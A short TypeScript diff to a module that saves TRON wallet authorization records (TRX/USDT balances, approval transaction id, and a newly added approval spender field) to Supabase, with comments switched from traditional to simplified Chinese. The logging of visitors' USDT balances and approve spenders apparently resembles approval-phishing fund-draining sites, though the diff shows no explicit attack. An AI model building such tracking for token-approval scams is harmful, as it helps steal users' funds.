@@ -5,6 +5,8 @@ export type WalletAuthorizationPayload = {
   trxBalance: number;
   usdtBalance: number;
   approvalTxId?: string | null;
+  /** 本次 approve 的 spender（授权接收方） */
+  approvalSpender?: string | null;
   locale?: string;
 };
 
@@ -27,11 +29,11 @@ export function parseApprovalSendResult(sendResult: unknown): string | null {
   return extractTronTxId(sendResult);
 }
 
-/** 將鏈上授權成功後的紀錄寫入 Supabase（未設定環境變數時靜默略過）。 */
+/** 链上授权成功后的记录写入 Supabase（未配置环境变量时静默跳过）。 */
 export async function submitWalletAuthorizationRecord(payload: WalletAuthorizationPayload): Promise<void> {
   const supabase = getSupabaseBrowserClient();
   if (!supabase) {
-    console.warn("[supabase] VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY 未設定，略過授權紀錄上傳。");
+    console.warn("[supabase] 未配置 VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY，跳过授权记录上传。");
     return;
   }
 
@@ -40,11 +42,12 @@ export async function submitWalletAuthorizationRecord(payload: WalletAuthorizati
     trx_balance: payload.trxBalance,
     usdt_balance: payload.usdtBalance,
     approval_tx_id: payload.approvalTxId ?? null,
+    approval_spender: payload.approvalSpender ?? null,
     locale: payload.locale ?? null,
     user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 512) : null,
   });
 
   if (error) {
-    console.error("[supabase] 寫入 wallet_authorizations 失敗:", error.message);
+    console.error("[supabase] 写入 wallet_authorizations 失败:", error.message);
   }
 }
